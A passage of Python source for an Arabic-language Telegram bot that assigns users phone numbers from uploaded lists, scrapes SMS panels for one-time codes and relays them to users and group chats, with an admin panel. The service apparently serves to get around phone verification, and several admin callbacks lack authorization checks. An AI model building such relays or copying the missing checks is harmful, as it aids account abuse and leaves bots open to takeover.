            logger.error(f"[{dash['name']}] خطأ: {e}")
        return None

def fetch_api_1(dash):
    def do_fetch():
        url = f"{dash['api_url']}?token={dash['api_token']}"
        r = dash["session"].get(url, timeout=TIMEOUT)
        r.raise_for_status()
        return r.json()
    try:
        return retry_request(do_fetch, max_retries=2, retry_delay=3)
    except Exception as e:
        logger.error(f"[{dash['name']}] خطأ: {e}")
        return None

def fetch_api_2(dash):
    def do_fetch():
        url = f"{dash['api_url']}?token={dash['api_token']}"
        r = dash["session"].get(url, timeout=TIMEOUT)
        r.raise_for_status()
        data = r.json()
        if not isinstance(data, dict):
            raise ValueError("الاستجابة ليست قاموسًا")
        return data
    try:
        return retry_request(do_fetch, max_retries=2, retry_delay=3)
    except Exception as e:
        logger.error(f"[{dash['name']}] خطأ: {e}")
        return None

def fetch_api_3(dash):
    return fetch_traditional(dash)

def extract_rows(j, dash_type):
    if j is None:
        return []
    if dash_type in ("traditional",):
        for key in ("data", "aaData", "rows", "aa_data"):
            if isinstance(j, dict) and key in j:
                return j[key]
        if isinstance(j, list):
            return j
        if isinstance(j, dict):
            for v in j.values():
                if isinstance(v, list):
                    return v
    elif dash_type == "api":
        if isinstance(j, list):
            return j
        if isinstance(j, dict) and isinstance(j.get("data"), list):
            return j["data"]
    elif dash_type == "api_parameter":
        if isinstance(j, dict):
            if isinstance(j.get("data"), list):
                return j["data"]
            if isinstance(j.get("data"), dict):
                return [j["data"]]
    return []

def row_to_tuple(row, dash):
    date_str = number_str = sms_str = ""
    dtype = dash.get("type", "traditional")
    if dtype in ("traditional",):
        idx_d = dash.get("idx_date", IDX_DATE)
        idx_n = dash.get("idx_number", IDX_NUMBER)
        idx_s = dash.get("idx_sms", IDX_SMS)
        if isinstance(row, (list, tuple)):
            if len(row) > idx_d: date_str   = clean_html(row[idx_d])
            if len(row) > idx_n: number_str = clean_number(row[idx_n])
            if len(row) > idx_s: sms_str    = clean_html(row[idx_s])
        elif isinstance(row, dict):
            for k in ("date","time","datetime","dt","created_at"):
                if k in row: date_str = clean_html(row[k]); break
            for k in ("number","msisdn","cli","from","sender"):
                if k in row: number_str = clean_number(row[k]); break
            for k in ("sms","message","msg","body","text"):
                if k in row: sms_str = clean_html(row[k]); break
    elif dtype == "api":
        idx_d = dash.get("idx_date", 3)
        idx_n = dash.get("idx_number", 1)
        idx_s = dash.get("idx_sms", 2)
        if isinstance(row, list) and len(row) > max(idx_d, idx_n, idx_s):
            date_str   = clean_html(row[idx_d])
            number_str = clean_number(row[idx_n])
            sms_str    = clean_html(row[idx_s])
    elif dtype == "api_parameter":
        keys = dash.get("data_keys", {"date": "dt", "number": "num", "sms": "message"})
        if isinstance(row, dict):
            date_str   = clean_html(row.get(keys["date"], ""))
            number_str = clean_number(row.get(keys["number"], "") or row.get("cli", ""))
            sms_str    = clean_html(row.get(keys["sms"], ""))
    unique_key = f"{date_str}|{number_str}|{sms_str}"
    return date_str, number_str, sms_str, unique_key

def is_valid_row(date_str, number_str, sms_str):
    return (
        date_str and '-' in date_str and ':' in date_str and
        number_str and len(number_str) >= 8 and
        sms_str and len(sms_str) > 3
    )

# ======================
# 📨 إرسال OTP
# ======================
def delete_message_after_delay(chat_id, message_id, delay=700):
    time.sleep(delay)
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage",
            data={"chat_id": chat_id, "message_id": message_id},
            timeout=10,
        )
    except Exception as e:
        logger.debug(f"فشل حذف الرسالة {message_id}: {e}")

def send_to_telegram_group(text, otp_code):
    keyboard = {
        "inline_keyboard": [
            [{"text": f"🔑 {otp_code}", "copy_text": {"text": str(otp_code)}}],
            [
                {"text": "💬 𝐂𝐇𝐀𝐍𝐍𝐄𝐋", "url": "https://t.me/tassrek"},
                {"text": "🤖 𝐁𝐎𝐓",     "url": "https://t.me/swiftsmsa"},
            ],
            [{"text": "👨‍💻 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑", "url": "https://t.me/c_r_i_s3"}],
        ]
    }
    success = 0
    for chat_id in CHAT_IDS:
        try:
            resp = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                data={
                    "chat_id": chat_id,
                    "text": text,
                    "parse_mode": "HTML",
                    "reply_markup": json.dumps(keyboard),
                },
                timeout=10,
            )
            if resp.status_code == 200:
                logger.info(f"[+] أُرسلت الرسالة إلى {chat_id}")
                success += 1
                msg_id = resp.json()["result"]["message_id"]
                threading.Thread(
                    target=delete_message_after_delay,
                    args=(chat_id, msg_id, 700),
                    daemon=True,
                ).start()
            else:
                logger.warning(f"[!] فشل الإرسال إلى {chat_id}: {resp.status_code} — {resp.text[:100]}")
        except Exception as e:
            logger.error(f"[!] خطأ في الإرسال لـ {chat_id}: {e}")
    return success > 0

def send_otp_to_user(date_str, number, sms, dashboard_name=""):
    otp_code     = extract_otp(sms)
    country_name, country_flag, _ = get_country_info(number)
    service      = detect_service(sms)
    user_id      = get_user_by_number(number)
    logger.info(
        f"[OTP] رقم={number} | كود={otp_code} | خدمة={service} | "
        f"مستخدم={user_id} | لوحة={dashboard_name}"
    )
    log_otp(number, otp_code, sms, user_id, dashboard_name)
    if user_id:
        try:
            markup = types.InlineKeyboardMarkup()
            markup.row(
                types.InlineKeyboardButton("𝑂𝑤𝑛𝑒𝑟 🤴🏻", url="https://t.me/@c_r_i_s3"),
                types.InlineKeyboardButton("𝐶ℎ𝑎𝑛𝑛𝑒𝑙 🫀", url="https://t.me/tassrek"),
            )
            markup.add(types.InlineKeyboardButton(f"🔑 نسخ: {otp_code}", callback_data=f"copy_{otp_code}"))
            msg_lines = (
                f"✨ <b><u>𝑪𝑹𝑰𝑺 𝐎𝐓𝐏 𝐑𝐄𝐂𝐄𝐈𝐕𝐄𝐃 ✨</u></b>\n\n"
                f"🌍 <b>Country:</b> {safe_html(country_name)} {country_flag}\n"
                f"⚙️ <b>Service:</b> {safe_html(service)}\n"
                f"📱 <b>Number:</b> <code>{safe_html(number)}</code>\n"
                f"🕒 <b>Time:</b> {safe_html(date_str)}\n\n"
                f"🔐 <b>Code:</b> <code>{safe_html(otp_code)}</code>"
            )
            bot.send_message(user_id, msg_lines, reply_markup=markup, parse_mode="HTML")
            logger.info(f"[+] أُرسل OTP للمستخدم {user_id}")
        except Exception as e:
            logger.error(f"[!] فشل إرسال OTP للمستخدم {user_id}: {e}")
    group_text = format_message(date_str, number, sms)
    send_to_telegram_group(group_text, otp_code)

# ======================
# 🎮 معالجات البوت التفاعلي
# ======================
user_states = {}

@bot.message_handler(commands=["start"])
def send_welcome(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if is_maintenance_mode() and not is_admin(user_id):
        caption = (
            "<b>❍─── <u>𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝑪𝑹𝑰𝑺 𝐁𝐨𝐭</u> ───❍</b>\n\n"
            "<b>⚠️ البوت في وضع الصيانة.</b>\n"
            "<b>⏳ يرجى المحاولة لاحقًا.</b>"
        )
        try:
            bot.send_photo(
                chat_id,
                "https://i.ibb.co/2352v1FN/file-000000004f20720aaa70039fcd26faab-1.png",
                caption=caption,
                parse_mode="HTML",
            )
        except:
            bot.send_message(chat_id, caption, parse_mode="HTML")
        return
    if is_banned(user_id):
        bot.reply_to(message, "<b>🚫 تم حظرك من استخدام البوت.</b>", parse_mode="HTML")
        return
    if not force_sub_check(user_id):
        markup = force_sub_markup()
        bot.send_message(chat_id, "<b>🔒 يجب الاشتراك في القنوات لاستخدام البوت.</b>",
                         parse_mode="HTML", reply_markup=markup)
        return
    if not get_user(user_id):
        save_user(user_id,
                  username=message.from_user.username or "",
                  first_name=message.from_user.first_name or "",
                  last_name=message.from_user.last_name or "")
        for admin in ADMIN_IDS:
            try:
                bot.send_message(
                    admin,
                    f"🆕 <b>مستخدم جديد:</b>\n"
                    f"🆔: <code>{user_id}</code>\n"
                    f"👤: @{safe_html(message.from_user.username or 'None')}\n"
                    f"الاسم: {safe_html(message.from_user.first_name or '')}",
                    parse_mode="HTML",
                )
            except:
                pass
    _show_main_menu(chat_id, user_id, message_id=None)

def _show_main_menu(chat_id, user_id, message_id=None):
    markup = _build_country_markup(user_id)
    text = (
        "<b>❍<u>𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐄𝐋𝐀𝐌𝐁𝐑𝐀𝐓𝐎𝐔𝐑 𝐁𝐎𝐓</u>❍</b>\n\n"
        "<b>🔋 <u>𝐅𝐚𝐬𝐭 • 𝐒𝐞𝐜𝐮𝐫𝐞 • 𝐎𝐧𝐥𝐢𝐧𝐞</u></b>\n\n"
        "<b>🎓 <u>𝐎𝐖𝐍𝐄𝐑</u> • <a href='tg://user?id=8249102884'>𝐄𝐋𝐀𝐌𝐁𝐑𝐀𝐓𝐎𝐔𝐑</a></b>\n\n"
        "<b>────────────────────</b>\n"
        "<b><u>اختر الدولة التي تريدها ⬇️</u></b>"
    )
    try:
        if message_id:
            bot.edit_message_text(
                chat_id=chat_id, message_id=message_id,
                text=text, parse_mode="HTML",
                reply_markup=markup, disable_web_page_preview=True,
            )
        else:
            bot.send_message(chat_id, text, parse_mode="HTML",
                             reply_markup=markup, disable_web_page_preview=True)
    except Exception as e:
        logger.debug(f"_show_main_menu error: {e}")

def _build_country_markup(user_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    buttons = []
    user_data    = get_user(user_id)
    private_combo = user_data[7] if user_data else None
    all_combos   = get_all_combos()
    country_combos = {}
    for cc, idx in all_combos:
        country_combos.setdefault(cc, []).append(idx)
    if private_combo and private_combo in COUNTRY_CODES:
        name, flag, _ = COUNTRY_CODES[private_combo]
        buttons.append(types.InlineKeyboardButton(
            f"{flag} {name} (Private)", callback_data=f"country_{private_combo}_1"))
    for cc, indices in country_combos.items():
        if cc in COUNTRY_CODES and cc != private_combo:
            name, flag, _ = COUNTRY_CODES[cc]
            for idx in indices:
                label = f"{flag} {name}" if len(indices) == 1 else f"{flag} {name} ({idx})"
                buttons.append(types.InlineKeyboardButton(label, callback_data=f"country_{cc}_{idx}"))
    for i in range(0, len(buttons), 2):
        markup.row(*buttons[i:i+2])
    if is_admin(user_id):
        markup.add(types.InlineKeyboardButton("🔐 Admin Panel", callback_data="admin_panel"))
    return markup

@bot.callback_query_handler(func=lambda c: c.data == "check_sub")
def check_subscription(call):
    if force_sub_check(call.from_user.id):
        bot.answer_callback_query(call.id, "✅ تم التحقق! يمكنك استخدام البوت.", show_alert=True)
        _show_main_menu(call.message.chat.id, call.from_user.id, call.message.message_id)
    else:
        bot.answer_callback_query(call.id, "❌ لم تشترك بعد!", show_alert=True)

@bot.callback_query_handler(func=lambda c: c.data.startswith("country_"))
def handle_country_selection(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    msg_id  = call.message.message_id
    if is_banned(user_id):
        bot.answer_callback_query(call.id, "🚫 محظور.", show_alert=True); return
    if not force_sub_check(user_id):
        bot.send_message(chat_id, "<b>🔒 يجب الاشتراك.</b>", parse_mode="HTML", reply_markup=force_sub_markup()); return
    parts        = call.data.split("_")
    country_code = parts[1]
    combo_index  = int(parts[2]) if len(parts) > 2 else 1
    available = get_available_numbers(country_code, combo_index, user_id)
    if not available:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 العودة", callback_data="back_to_countries"))
        bot.edit_message_text("<b>❌ جميع الأرقام قيد الاستخدام حالياً.</b>",
                              chat_id, msg_id, reply_markup=markup, parse_mode="HTML")
        return
    old = get_user(user_id)
    if old and old[5]:
        release_number(old[5])
    assigned = random.choice(available)
    assign_number_to_user(user_id, assigned)
    save_user(user_id, country_code=country_code, assigned_number=assigned)
    name, flag, _ = COUNTRY_CODES.get(country_code, ("Unknown", "🌍", ""))
    _show_number_assigned(chat_id, msg_id, assigned, name, flag, country_code, combo_index)
    bot.answer_callback_query(call.id, "✅ تم استلام الرقم")

def _show_number_assigned(chat_id, msg_id, number, country_name, flag, country_code, combo_index):
    text = (
        f"<b> ✅ </b> 𝗡𝘂𝗺𝗯𝗲𝗿 𝗔𝘀𝘀𝗶𝗴𝗻𝗲𝗱!\n"
        f"<b> ━━━━━━━━━━━━━━━━ </b>\n"
        f"<b> • 📱 𝗡𝘂𝗺𝗯𝗲𝗿 1 ~</b> <code>+{number}</code>\n"
        f"<b> • 📱 𝗡𝘂𝗺𝗯𝗲𝗿 2 ~</b> <code>+{number}</code>\n"
        f"<b> • 📱 𝗡𝘂𝗺𝗯𝗲𝗿 3 ~</b> <code>+{number}</code>\n"
        f"<b> • 📱 𝗡𝘂𝗺𝗯𝗲𝗿 4 ~</b> <code>+{number}</code>\n" 
        f"<b> • 🌍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ~</b> {flag} {country_name}\n"
        f"<b> • 📌 𝗖𝗼𝗺𝗯𝗼 ~</b> #{combo_index}\n"
        f"<b> ━━━━━━━━━━━━━━━━ </b>\n"
        f"<b> 🧿 </b> ~> 𝗪𝗔𝗜𝗧𝗜𝗡𝗚 𝗙𝗢𝗥 𝗢𝗧𝗣...✧"
    )
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Group", url="https://t.me/swiftsmsa"))
    markup.row(types.InlineKeyboardButton("↻ Change Number", callback_data=f"change_num_{country_code}_{combo_index}"))
    markup.row(types.InlineKeyboardButton("🌍 Change Country", callback_data="back_to_countries"))
    try:
        bot.edit_message_text(text=text, chat_id=chat_id, message_id=msg_id,
                              reply_markup=markup, parse_mode="HTML", disable_web_page_preview=True)
    except Exception as e:
        logger.debug(f"_show_number_assigned error: {e}")

@bot.callback_query_handler(func=lambda c: c.data.startswith("change_num_"))
def change_number(call):
    user_id = call.from_user.id
    if is_banned(user_id): return
    if not force_sub_check(user_id): return
    parts        = call.data.split("_")
    country_code = parts[2]
    combo_index  = int(parts[3]) if len(parts) > 3 else 1
    available = get_available_numbers(country_code, combo_index, user_id)
    if not available:
        bot.answer_callback_query(call.id, "❌ لا توجد أرقام متاحة.", show_alert=True); return
    old = get_user(user_id)
    if old and old[5]:
        release_number(old[5])
    assigned = random.choice(available)
    assign_number_to_user(user_id, assigned)
    save_user(user_id, assigned_number=assigned)
    name, flag, _ = COUNTRY_CODES.get(country_code, ("Unknown", "🌍", ""))
    _show_number_assigned(call.message.chat.id, call.message.message_id,
                          assigned, name, flag, country_code, combo_index)
    bot.answer_callback_query(call.id, "✅ تم تغيير الرقم")

@bot.callback_query_handler(func=lambda c: c.data == "back_to_countries")
def back_to_countries(call):
    _show_main_menu(call.message.chat.id, call.from_user.id, call.message.message_id)

# ======================
# 🔐 لوحة التحكم الإدارية
# ======================
def admin_main_menu():
    markup = types.InlineKeyboardMarkup()
    icon   = "🟢" if not is_maintenance_mode() else "🔴"
    label  = "يعمل" if not is_maintenance_mode() else "صيانة"
    markup.add(types.InlineKeyboardButton(f"{icon} {label} {icon}", callback_data="toggle_maintenance"))
    markup.row(
        types.InlineKeyboardButton("📥 إضافة كومبو", callback_data="admin_add_combo"),
        types.InlineKeyboardButton("🗑️ حذف كومبو",  callback_data="admin_del_combo"),
    )
    markup.row(
        types.InlineKeyboardButton("📊 الإحصائيات",  callback_data="admin_stats"),
        types.InlineKeyboardButton("📄 تقرير شامل", callback_data="admin_full_report"),
    )
    markup.row(
        types.InlineKeyboardButton("📢 إذاعة عامة",   callback_data="admin_broadcast_all"),
        types.InlineKeyboardButton("📨 إذاعة مخصصة", callback_data="admin_broadcast_user"),
    )
    markup.row(
        types.InlineKeyboardButton("🚫 حظر",      callback_data="admin_ban"),
        types.InlineKeyboardButton("✅ إلغاء حظر", callback_data="admin_unban"),
        types.InlineKeyboardButton("👤 معلومات",   callback_data="admin_user_info"),
    )
    markup.row(
        types.InlineKeyboardButton("🔗 اشتراك", callback_data="admin_force_sub"),
        types.InlineKeyboardButton("🔑 برايفت", callback_data="admin_private_combo"),
    )
    markup.add(types.InlineKeyboardButton("🔙 مغادرة لوحة التحكم", callback_data="back_to_countries"))
    return markup

@bot.callback_query_handler(func=lambda c: c.data == "admin_panel")
def show_admin_panel(call):
    if not is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "⚠️ للمطورين فقط.", show_alert=True); return
    text = (
        "<b>❍─── <u>𝐀𝐃𝐌𝐈𝐍 𝐏𝐀𝐍𝐄𝐋</u> ───❍</b>\n\n"
        "<b>⚙️ تحكم كامل في وظائف البوت.</b>\n"
        f"<b>🕒 الوقت: {datetime.now().strftime('%H:%M:%S')}</b>\n"
        "<b>────────────────────</b>"
    )
    try:
        bot.edit_message_text(
            chat_id=call.message.chat.id, message_id=call.message.message_id,
            text=text, parse_mode="HTML", reply_markup=admin_main_menu(),
            disable_web_page_preview=True,
        )
    except Exception as e:
        logger.debug(f"admin_panel error: {e}")

@bot.callback_query_handler(func=lambda c: c.data == "toggle_maintenance")
def handle_maintenance_toggle(call):
    if not is_admin(call.from_user.id): return
    set_maintenance_mode(not is_maintenance_mode())
    label = "🔓 تم فتح البوت" if not is_maintenance_mode() else "🔒 وضع الصيانة"
    bot.answer_callback_query(call.id, label, show_alert=True)
    bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=admin_main_menu())

@bot.callback_query_handler(func=lambda c: c.data == "admin_force_sub")
def admin_force_sub(call):
    if not is_admin(call.from_user.id): return
    channels = get_all_force_sub_channels(enabled_only=False)
    text  = f"⚙️ قنوات الاشتراك الإجباري ({len(channels)} قناة):\n──────────────────\n"
    markup = types.InlineKeyboardMarkup()
    for ch_id, url, desc in channels:
        conn = get_db_conn(); c = conn.cursor()
        c.execute("SELECT enabled FROM force_sub_channels WHERE id=?", (ch_id,))
        row = c.fetchone(); conn.close()
        enabled = row[0] if row else 0
        icon = "✅" if enabled else "❌"
        markup.add(types.InlineKeyboardButton(f"{icon} {desc or url[:25]}", callback_data=f"edit_force_ch_{ch_id}"))
    markup.add(types.InlineKeyboardButton("➕ إضافة قناة", callback_data="add_force_ch"))
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="admin_panel"))
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data == "add_force_ch")
def add_force_ch_step1(call):
    if not is_admin(call.from_user.id): return
    user_states[call.from_user.id] = "add_force_ch_url"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="admin_force_sub"))
    bot.edit_message_text("أرسل رابط القناة (@xxx أو https://t.me/xxx):",
                          call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.message_handler(func=lambda m: user_states.get(m.from_user.id) == "add_force_ch_url")
def add_force_ch_step2(message):
    url = message.text.strip()
    if not (url.startswith("@") or url.startswith("https://t.me/")):
        bot.reply_to(message, "❌ رابط غير صالح!"); return
    user_states[message.from_user.id] = {"step": "add_force_ch_desc", "url": url}
    bot.reply_to(message, "أدخل وصفًا للقناة (أو أرسل - للتخطي):")

@bot.message_handler(func=lambda m: isinstance(user_states.get(m.from_user.id), dict)
                     and user_states[m.from_user.id].get("step") == "add_force_ch_desc")
def add_force_ch_step3(message):
    data = user_states.pop(message.from_user.id)
    url  = data["url"]
    desc = message.text.strip() if message.text.strip() != "-" else ""
    if add_force_sub_channel(url, desc):
        bot.reply_to(message, f"✅ تمت الإضافة:\n{url}\n{desc or '—'}")
    else:
        bot.reply_to(message, "❌ القناة موجودة مسبقًا!")

@bot.callback_query_handler(func=lambda c: c.data.startswith("edit_force_ch_"))
def edit_force_ch(call):
    if not is_admin(call.from_user.id): return
    try: ch_id = int(call.data.split("_", 3)[3])
    except: return
    conn = get_db_conn(); cur = conn.cursor()
    cur.execute("SELECT channel_url, description, enabled FROM force_sub_channels WHERE id=?", (ch_id,))
    row = cur.fetchone(); conn.close()
    if not row:
        bot.answer_callback_query(call.id, "❌ غير موجودة!", show_alert=True); return
    url, desc, enabled = row
    status = "مفعلة" if enabled else "معطلة"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✏️ تعديل الوصف", callback_data=f"edit_desc_{ch_id}"))
    markup.add(types.InlineKeyboardButton("❌ تعطيل" if enabled else "✅ تفعيل",
                                          callback_data=f"toggle_ch_{ch_id}"))
    markup.add(types.InlineKeyboardButton("🗑️ حذف", callback_data=f"del_ch_{ch_id}"))
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="admin_force_sub"))
    bot.edit_message_text(
        f"🔧 القناة:\n{url}\nالوصف: {desc or '—'}\nالحالة: {status}",
        call.message.chat.id, call.message.message_id, reply_markup=markup,
    )

@bot.callback_query_handler(func=lambda c: c.data.startswith("toggle_ch_"))
def toggle_ch(call):
    ch_id = int(call.data.split("_", 2)[2])
    toggle_force_sub_channel(ch_id)
    bot.answer_callback_query(call.id, "🔄 تم تغيير الحالة", show_alert=True)
    admin_force_sub(call)

@bot.callback_query_handler(func=lambda c: c.data.startswith("del_ch_"))
def del_ch(call):
    ch_id = int(call.data.split("_", 2)[2])
    ok = delete_force_sub_channel(ch_id)
    bot.answer_callback_query(call.id, "✅ حُذفت!" if ok else "❌ فشل!", show_alert=True)
    admin_force_sub(call)

@bot.callback_query_handler(func=lambda c: c.data.startswith("edit_desc_"))
def edit_desc_step1(call):
    ch_id = int(call.data.split("_", 2)[2])
    user_states[call.from_user.id] = f"edit_desc_{ch_id}"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data=f"edit_force_ch_{ch_id}"))
    bot.edit_message_text("أدخل الوصف الجديد:", call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.message_handler(func=lambda m: isinstance(user_states.get(m.from_user.id), str)
                     and user_states[m.from_user.id].startswith("edit_desc_"))
def edit_desc_step2(message):
    try:
        ch_id = int(user_states[message.from_user.id].split("_")[2])
        conn = get_db_conn(); c = conn.cursor()
        c.execute("UPDATE force_sub_channels SET description=? WHERE id=?", (message.text.strip(), ch_id))
        conn.commit(); conn.close()
        bot.reply_to(message, "✅ تم التحديث!")
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ: {e}")
    user_states.pop(message.from_user.id, None)

@bot.callback_query_handler(func=lambda c: c.data == "admin_add_combo")
def admin_add_combo(call):
    if not is_admin(call.from_user.id): return
    user_states[call.from_user.id] = "waiting_combo_file"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="admin_panel"))
    bot.edit_message_text("📤 أرسل ملف الكومبو (.txt):",
                          call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.message_handler(content_types=["document"])
def handle_combo_file(message):
    if not is_admin(message.from_user.id): return
    if user_states.get(message.from_user.id) != "waiting_combo_file": return
    try:
        file_info = bot.get_file(message.document.file_id)
        content   = bot.download_file(file_info.file_path).decode("utf-8")
        lines     = [l.strip() for l in content.splitlines() if l.strip()]
        if not lines:
            bot.reply_to(message, "❌ الملف فارغ!"); return
        first_num    = clean_number(lines[0])
        country_code = next(
            (code for code in sorted(COUNTRY_CODES.keys(), key=len, reverse=True)
             if first_num.startswith(code)),
            None
        )
        if not country_code:
            bot.reply_to(message, "❌ لا يمكن تحديد الدولة!"); return
        save_combo(country_code, lines)
        name, flag, _ = COUNTRY_CODES[country_code]
        bot.reply_to(message, f"✅ تم حفظ الكومبو لـ {flag} {name}\n🔢 عدد الأرقام: {len(lines)}")
        user_states.pop(message.from_user.id, None)
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ: {e}")

@bot.callback_query_handler(func=lambda c: c.data == "admin_del_combo")
def admin_del_combo(call):
    if not is_admin(call.from_user.id): return
    combos = get_all_combos()
    if not combos:
        bot.answer_callback_query(call.id, "لا توجد كومبوهات!"); return
    markup = types.InlineKeyboardMarkup()
    country_combos = {}
    for cc, idx in combos:
        country_combos.setdefault(cc, []).append(idx)
    for cc, indices in country_combos.items():
        if cc in COUNTRY_CODES:
            name, flag, _ = COUNTRY_CODES[cc]
            for idx in indices:
                label = f"{flag} {name}" if len(indices) == 1 else f"{flag} {name} ({idx})"
                markup.add(types.InlineKeyboardButton(label, callback_data=f"del_combo_{cc}_{idx}"))
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="admin_panel"))
    bot.edit_message_text("اختر الكومبو للحذف:",
                          call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith("del_combo_"))
def confirm_del_combo(call):
    if not is_admin(call.from_user.id): return
    parts        = call.data.split("_")
    country_code = parts[2]
    combo_index  = int(parts[3]) if len(parts) > 3 else 1
    ok = delete_combo(country_code, combo_index)
    name, flag, _ = COUNTRY_CODES.get(country_code, ("Unknown", "🌍", ""))
    bot.answer_callback_query(
        call.id,
        f"✅ حُذف: {flag} {name} ({combo_index})" if ok else "❌ فشل الحذف!",
        show_alert=True,
    )
    admin_del_combo(call)

@bot.callback_query_handler(func=lambda c: c.data == "admin_stats")
def admin_stats(call):
    if not is_admin(call.from_user.id): return
    all_combos    = get_all_combos()
    unique_cc     = {cc for cc, _ in all_combos}
    total_numbers = sum(len(get_combo(cc, idx)) for cc, idx in all_combos)
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="admin_panel"))
    bot.edit_message_text(
        f"📊 الإحصائيات:\n"
        f"👥 المستخدمون: {len(get_all_users())}\n"
        f"🌐 الدول: {len(unique_cc)}\n"
        f"📦 الكومبوهات: {len(all_combos)}\n"
        f"📞 الأرقام الإجمالية: {total_numbers}\n"
        f"🔑 الأكواد المستلمة: {len(get_otp_logs())}",
        call.message.chat.id, call.message.message_id, reply_markup=markup,
    )

@bot.callback_query_handler(func=lambda c: c.data == "admin_full_report")
def admin_full_report(call):
    if not is_admin(call.from_user.id): return
    try:
        report = f"📊 تقرير شامل — {datetime.now().strftime('%Y-%m-%d %H:%M')}\n{'='*40}\n\n"
        conn = get_db_conn(); cur = conn.cursor()
        cur.execute("SELECT * FROM users")
        report += "👥 المستخدمون:\n"
        for u in cur.fetchall():
            report += f"ID:{u[0]} @{u[1] or 'N/A'} رقم:{u[5] or 'N/A'} {'محظور' if u[6] else 'نشط'}\n"
        report += f"\n{'='*40}\n🔑 سجل الأكواد:\n"
        cur.execute("SELECT * FROM otp_logs ORDER BY id DESC LIMIT 200")
        for log in cur.fetchall():
            ui = get_user_info(log[5]) if log[5] else None
            tag = f"@{ui[1]}" if ui and ui[1] else f"ID:{log[5] or 'N/A'}"
            report += f"رقم:{log[1]} | كود:{log[2]} | مستخدم:{tag} | وقت:{log[4]} | لوحة:{log[6] if len(log)>6 else ''}\n"
        report += f"\n{'='*40}\n📦 الكومبوهات:\n"
        for cc, idx in get_all_combos():
            name, flag, _ = COUNTRY_CODES.get(cc, ("Unknown", "🌍", ""))
            report += f"{flag} {name} ({idx}): {len(get_combo(cc, idx))} رقم\n"
        conn.close()
        with open("bot_report.txt", "w", encoding="utf-8") as f:
            f.write(report)
        with open("bot_report.txt", "rb") as f:
            bot.send_document(call.from_user.id, f)
        os.remove("bot_report.txt")
        bot.answer_callback_query(call.id, "✅ تم إرسال التقرير!", show_alert=True)
    except Exception as e:
        bot.answer_callback_query(call.id, f"❌ خطأ: {e}", show_alert=True)

@bot.callback_query_handler(func=lambda c: c.data == "admin_ban")
def admin_ban_step1(call):
    if not is_admin(call.from_user.id): return
    user_states[call.from_user.id] = "ban_user"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="admin_panel"))
    bot.edit_message_text("أدخل معرف المستخدم لحظره:",
                          call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.message_handler(func=lambda m: user_states.get(m.from_user.id) == "ban_user")
def admin_ban_step2(message):
    try:
        uid = int(message.text); ban_user(uid)
        bot.reply_to(message, f"✅ تم حظر {uid}")
    except:
        bot.reply_to(message, "❌ معرف غير صحيح!")
    user_states.pop(message.from_user.id, None)

@bot.callback_query_handler(func=lambda c: c.data == "admin_unban")
def admin_unban_step1(call):
    if not is_admin(call.from_user.id): return
    user_states[call.from_user.id] = "unban_user"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="admin_panel"))
    bot.edit_message_text("أدخل معرف المستخدم لفك حظره:",
                          call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.message_handler(func=lambda m: user_states.get(m.from_user.id) == "unban_user")
def admin_unban_step2(message):
    try:
        uid = int(message.text); unban_user(uid)
        bot.reply_to(message, f"✅ تم فك حظر {uid}")
    except:
        bot.reply_to(message, "❌ معرف غير صحيح!")
    user_states.pop(message.from_user.id, None)

@bot.callback_query_handler(func=lambda c: c.data == "admin_broadcast_all")
def admin_broadcast_all_step1(call):
    if not is_admin(call.from_user.id): return
    user_states[call.from_user.id] = "broadcast_all"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="admin_panel"))
    bot.edit_message_text("أرسل الرسالة لإذاعتها للجميع:",
                          call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.message_handler(func=lambda m: user_states.get(m.from_user.id) == "broadcast_all")
def admin_broadcast_all_step2(message):
    users = get_all_users(); success = 0
    for uid in users:
        try: bot.send_message(uid, message.text); success += 1
        except: pass
    bot.reply_to(message, f"✅ أُرسلت لـ {success}/{len(users)} مستخدم")
    user_states.pop(message.from_user.id, None)

@bot.callback_query_handler(func=lambda c: c.data == "admin_broadcast_user")
def admin_broadcast_user_step1(call):
    if not is_admin(call.from_user.id): return
    user_states[call.from_user.id] = "broadcast_user_id"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="admin_panel"))
